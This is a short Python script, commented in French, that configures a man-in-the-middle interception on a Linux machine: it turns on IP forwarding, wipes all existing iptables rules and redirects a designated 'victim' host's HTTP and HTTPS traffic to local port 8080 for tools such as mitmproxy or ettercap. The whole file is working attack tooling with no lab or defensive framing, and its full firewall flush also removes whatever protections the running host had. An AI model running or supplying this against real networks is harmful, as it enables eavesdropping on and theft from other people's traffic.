import subprocess
import sys


def run_command(command):
    """Exécute une commande shell et gère les erreurs."""
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[Erreur] La commande a échoué : {e}")
        sys.exit(1)


def enable_ip_forwarding():
    """Active le transfert d'IP dans le noyau Linux."""
    print("[*] Activation du transfert IP (IP Forwarding)...")
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1\n")


def setup_iptables_rules(interface, target_ip, attacker_ip):
    """Configure les règles iptables pour intercepter et rediriger le trafic."""
    print(f"[*] Application des règles iptables sur l'interface {interface}...")

    # 1. Réinitialiser les anciennes règles pour éviter les conflits
    run_command("iptables --flush")
    run_command("iptables --table nat --flush")
    run_command("iptables --delete-chain")
    run_command("iptables --table nat --delete-chain")

    # 2. Politique par défaut : Accepter tout
    run_command("iptables -P FORWARD ACCEPT")

    # 3. Rediriger le trafic de la cible vers le port d'écoute local (ex: port 8080 pour mitmproxy/ettercap)
    print(f"[*] Redirection du trafic de {target_ip} vers {attacker_ip}...")
    run_command(
        f"iptables -t nat -A PREROUTING -p tcp -s {target_ip} --destination-port 80 -j REDIRECT --to-ports 8080")
    run_command(
        f"iptables -t nat -A PREROUTING -p tcp -s {target_ip} --destination-port 443 -j REDIRECT --to-ports 8080")

    # 4. Autoriser le trafic transitant via la carte réseau
    run_command(f"iptables -A FORWARD -i {interface} -j ACCEPT")
    run_command(f"iptables -A FORWARD -o {interface} -j ACCEPT")

    print("[+] Configuration iptables terminée et active.")


if __name__ == "__main__":
    # Paramètres à configurer selon votre environnement
    INTERFACE_RESEAU = "eth0"  # Votre carte réseau (ex: wlan0, eth0)
    IP_CIBLE = "192.168.1.50"  # Adresse IP de la machine victime
    IP_ATTAQUANT = "192.168.1.100"  # Adresse IP de votre machine (attaquant)

    enable_ip_forwarding()
    setup_iptables_rules(INTERFACE_RESEAU, IP_CIBLE, IP_ATTAQUANT)

    print("\n[*] Prêt. Le trafic sera redirigé en continu. Appuyez sur Ctrl+C pour arrêter.")

    # Maintient le script actif pour conserver les règles dynamiques
    try:
        subprocess.run("tail -f /dev/null", shell=True)
    except KeyboardInterrupt:
        print("\n[*] Arrêt du script et nettoyage des règles...")
        run_command("iptables --flush")
        run_command("iptables --table nat --flush")
        print("[+] Terminé.")
